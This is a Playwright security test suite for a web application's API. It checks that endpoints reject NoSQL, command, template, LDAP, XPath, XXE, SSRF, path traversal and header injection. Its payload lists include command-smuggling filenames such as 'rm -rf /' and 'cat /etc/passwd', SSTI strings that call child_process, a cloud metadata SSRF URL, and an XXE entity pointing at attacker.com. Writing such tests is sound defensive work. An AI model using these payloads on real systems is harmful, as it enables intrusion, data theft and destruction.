/**
 * Comprehensive Injection Attack Tests (Day 50)
 *
 * Tests for all types of injection vulnerabilities:
 * - SQL Injection (complementing existing sql-injection.test.ts)
 * - NoSQL Injection
 * - Command Injection
 * - LDAP Injection
 * - XPath Injection
 * - Template Injection
 * - Server-Side Request Forgery (SSRF)
 */

import { test, expect } from '@playwright/test';

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

test.describe('NoSQL Injection Tests', () => {
  test('should prevent NoSQL injection in MongoDB-style queries', async ({ request }) => {
    const maliciousPayloads = [
      { email: { $ne: null } }, // Match all
      { email: { $gt: '' } }, // Greater than empty string
      { password: { $regex: '.*' } }, // Regex match all
    ];

    for (const payload of maliciousPayloads) {
      const response = await request.post(`${BASE_URL}/api/auth/login`, {
        data: payload,
      });

      // Should not authenticate
      expect(response.status()).not.toBe(200);
    }
  });

  test('should sanitize JSON inputs in search', async ({ request }) => {
    const response = await request.get(`${BASE_URL}/api/employees`, {
      params: {
        filter: JSON.stringify({ $where: 'this.salary > 100000' }),
      },
    });

    // Should reject or safely handle $where operator
    expect([400, 403]).toContain(response.status());
  });

  test('should prevent operator injection in filters', async ({ request }) => {
    const maliciousOperators = [
      '$ne',
      '$gt',
      '$lt',
      '$in',
      '$nin',
      '$regex',
      '$where',
      '$expr',
    ];

    for (const operator of maliciousOperators) {
      const response = await request.get(`${BASE_URL}/api/employees`, {
        params: {
          email: JSON.stringify({ [operator]: '' }),
        },
      });

      // Should either return 400 or safely ignore
      const status = response.status();
      expect(status === 400 || status === 200).toBeTruthy();

      if (status === 200) {
        const data = await response.json();
        // Should not return all records
        expect(Array.isArray(data) ? data.length : 0).toBeLessThan(100);
      }
    }
  });
});

test.describe('Command Injection Tests', () => {
  test('should prevent command injection in file export', async ({ request }) => {
    const maliciousFilenames = [
      'report.pdf; rm -rf /',
      'report.pdf | cat /etc/passwd',
      'report.pdf && whoami',
      'report.pdf`whoami`',
      'report.pdf$(whoami)',
    ];

    for (const filename of maliciousFilenames) {
      const response = await request.post(`${BASE_URL}/api/exports/generate`, {
        data: {
          type: 'employees',
          filename,
          format: 'pdf',
        },
      });

      // Should reject or sanitize filename
      expect([400, 403]).toContain(response.status());
    }
  });

  test('should prevent command injection in email sending', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/notifications/send-email`, {
      data: {
        to: 'user@example.com; cat /etc/passwd |',
        subject: 'Test',
        body: 'Test',
      },
    });

    expect([400, 403]).toContain(response.status());
  });

  test('should sanitize inputs in file processing', async ({ request }) => {
    // Test with malicious file path
    const response = await request.post(`${BASE_URL}/api/files/process`, {
      data: {
        filePath: '../../../etc/passwd',
      },
    });

    expect([400, 403, 404]).toContain(response.status());
  });
});

test.describe('LDAP Injection Tests', () => {
  test.skip('should prevent LDAP injection in authentication', async ({ request }) => {
    const maliciousPayloads = [
      '*',
      '*)(&',
      '*)(|(objectClass=*',
      'admin)(|(password=*))',
    ];

    for (const payload of maliciousPayloads) {
      const response = await request.post(`${BASE_URL}/api/auth/ldap-login`, {
        data: {
          username: payload,
          password: 'password',
        },
      });

      expect(response.status()).not.toBe(200);
    }
  });

  test.skip('should sanitize LDAP search queries', async ({ request }) => {
    const response = await request.get(`${BASE_URL}/api/directory/search`, {
      params: {
        query: 'user*)(|(cn=*))',
      },
    });

    // Should escape special LDAP characters
    expect([400, 403]).toContain(response.status());
  });
});

test.describe('XPath Injection Tests', () => {
  test.skip('should prevent XPath injection in XML queries', async ({ request }) => {
    const maliciousPayloads = [
      "' or '1'='1",
      "' or 1=1 or ''='",
      "x' or name()='username' or 'x'='y",
    ];

    for (const payload of maliciousPayloads) {
      const response = await request.post(`${BASE_URL}/api/xml/query`, {
        data: {
          username: payload,
        },
      });

      expect(response.status()).not.toBe(200);
    }
  });
});

test.describe('Template Injection Tests', () => {
  test('should prevent server-side template injection in emails', async ({ request }) => {
    const maliciousTemplates = [
      '{{ constructor.constructor("return process")().exit() }}',
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '{{this.constructor.constructor("return process")().mainModule.require("child_process").exec("ls")}}',
    ];

    for (const template of maliciousTemplates) {
      const response = await request.post(`${BASE_URL}/api/notifications/send`, {
        data: {
          to: 'user@example.com',
          template: 'custom',
          customTemplate: template,
        },
      });

      // Should reject template injection attempts
      expect([400, 403]).toContain(response.status());
    }
  });

  test('should prevent SSTI in report generation', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/reports/generate`, {
      data: {
        type: 'custom',
        template: '{{ config }}',
      },
    });

    expect([400, 403]).toContain(response.status());
  });

  test('should sanitize user input in document templates', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/documents/generate`, {
      data: {
        templateId: 'offer-letter',
        variables: {
          name: '{{constructor.constructor("return process")()}}',
        },
      },
    });

    // Should either reject or safely escape
    if (response.ok()) {
      const content = await response.text();
      expect(content).not.toContain('constructor.constructor');
    }
  });
});

test.describe('Server-Side Request Forgery (SSRF)', () => {
  test('should prevent SSRF in URL fetching', async ({ request }) => {
    const maliciousUrls = [
      'http://localhost:3000/api/admin/secret',
      'http://127.0.0.1/admin',
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'file:///etc/passwd',
      'http://internal-service:8080/admin',
    ];

    for (const url of maliciousUrls) {
      const response = await request.post(`${BASE_URL}/api/utils/fetch-url`, {
        data: { url },
      });

      // Should reject internal URLs
      expect([400, 403]).toContain(response.status());
    }
  });

  test('should prevent SSRF in webhook configuration', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/webhooks`, {
      data: {
        url: 'http://localhost:5432', // PostgreSQL port
        events: ['employee.created'],
      },
    });

    expect([400, 403]).toContain(response.status());
  });

  test('should validate URL scheme in profile picture uploads', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/users/profile-picture`, {
      data: {
        imageUrl: 'file:///etc/passwd',
      },
    });

    expect([400, 403]).toContain(response.status());
  });
});

test.describe('Path Traversal', () => {
  test('should prevent directory traversal in file downloads', async ({ request }) => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file:///etc/passwd',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM',
    ];

    for (const path of maliciousPaths) {
      const response = await request.get(`${BASE_URL}/api/files/download`, {
        params: { path },
      });

      expect([400, 403, 404]).toContain(response.status());
    }
  });

  test('should sanitize file paths in document retrieval', async ({ request }) => {
    const response = await request.get(`${BASE_URL}/api/documents/view`, {
      params: {
        file: '../../../../etc/passwd',
      },
    });

    expect([400, 403, 404]).toContain(response.status());
  });

  test('should prevent null byte injection', async ({ request }) => {
    const response = await request.get(`${BASE_URL}/api/files/download`, {
      params: {
        file: 'document.pdf%00.txt',
      },
    });

    expect([400, 403, 404]).toContain(response.status());
  });
});

test.describe('XML External Entity (XXE) Injection', () => {
  test.skip('should prevent XXE in XML file uploads', async ({ request }) => {
    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<employee>
  <name>&xxe;</name>
</employee>`;

    const response = await request.post(`${BASE_URL}/api/import/xml`, {
      data: {
        xml: xxePayload,
      },
    });

    expect([400, 403]).toContain(response.status());
  });

  test.skip('should disable external entity resolution', async ({ request }) => {
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "http://attacker.com/steal-data">
]>
<data>&file;</data>`;

    const response = await request.post(`${BASE_URL}/api/import/xml`, {
      data: { xml: xxePayload },
    });

    // Should not make external request
    expect([400, 403]).toContain(response.status());
  });
});

test.describe('Expression Language Injection', () => {
  test.skip('should prevent EL injection in search expressions', async ({ request }) => {
    const maliciousExpressions = [
      '${applicationScope}',
      '${facesContext.externalContext.request}',
      '#{request}',
    ];

    for (const expr of maliciousExpressions) {
      const response = await request.get(`${BASE_URL}/api/search`, {
        params: { q: expr },
      });

      // Should not evaluate expression
      if (response.ok()) {
        const result = await response.json();
        expect(JSON.stringify(result)).not.toContain('request');
      }
    }
  });
});

test.describe('Log Injection', () => {
  test('should prevent log injection via newline characters', async ({ request }) => {
    const maliciousInput = 'normaluser\n[INFO] User admin logged in successfully';

    const response = await request.post(`${BASE_URL}/api/auth/login`, {
      data: {
        email: maliciousInput,
        password: 'test',
      },
    });

    // Log injection doesn't prevent login, but logs should be sanitized
    // This is more of a logging best practice check
    expect(true).toBeTruthy();
  });

  test('should sanitize CRLF in log messages', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/feedback`, {
      data: {
        message: 'Feedback\r\n[CRITICAL] System compromised',
      },
    });

    // Should accept feedback but sanitize for logs
    expect([200, 201, 400]).toContain(response.status());
  });
});

test.describe('Host Header Injection', () => {
  test('should reject malicious Host headers', async ({ request }) => {
    const maliciousHosts = [
      'attacker.com',
      'evil.com',
      'localhost\r\nX-Forwarded-Host: evil.com',
    ];

    for (const host of maliciousHosts) {
      const response = await request.get(`${BASE_URL}/api/health`, {
        headers: { Host: host },
      });

      // Should either reject or ignore malicious host
      expect([400, 403, 200]).toContain(response.status());
    }
  });

  test('should validate Host header in password reset', async ({ request }) => {
    const response = await request.post(`${BASE_URL}/api/auth/forgot-password`, {
      data: { email: 'user@example.com' },
      headers: { Host: 'evil.com' },
    });

    // Should not send reset email to malicious domain
    expect([200, 400]).toContain(response.status());
  });
});

test.describe('Input Validation Edge Cases', () => {
  test('should handle extremely long inputs', async ({ request }) => {
    const longString = 'A'.repeat(1000000); // 1MB string

    const response = await request.post(`${BASE_URL}/api/employees`, {
      data: {
        firstName: longString,
        lastName: 'Test',
        email: 'test@example.com',
      },
    });

    expect([400, 413]).toContain(response.status()); // 413 = Payload Too Large
  });

  test('should handle unicode and special characters safely', async ({ request }) => {
    const specialChars = [
      '𝕳𝖊𝖑𝖑𝖔', // Unicode math symbols
      '🔥💯', // Emojis
      'test\u0000null', // Null byte
      'test\u202Eright-to-left', // Right-to-left override
    ];

    for (const input of specialChars) {
      const response = await request.post(`${BASE_URL}/api/employees/search`, {
        data: { query: input },
      });

      // Should handle safely without errors
      expect([200, 400]).toContain(response.status());
    }
  });

  test('should handle nested JSON objects', async ({ request }) => {
    // Create deeply nested object (potential DoS)
    let nested: any = { value: 'deep' };
    for (let i = 0; i < 1000; i++) {
      nested = { nested };
    }

    const response = await request.post(`${BASE_URL}/api/data`, {
      data: nested,
    });

    expect([400, 413]).toContain(response.status());
  });
});
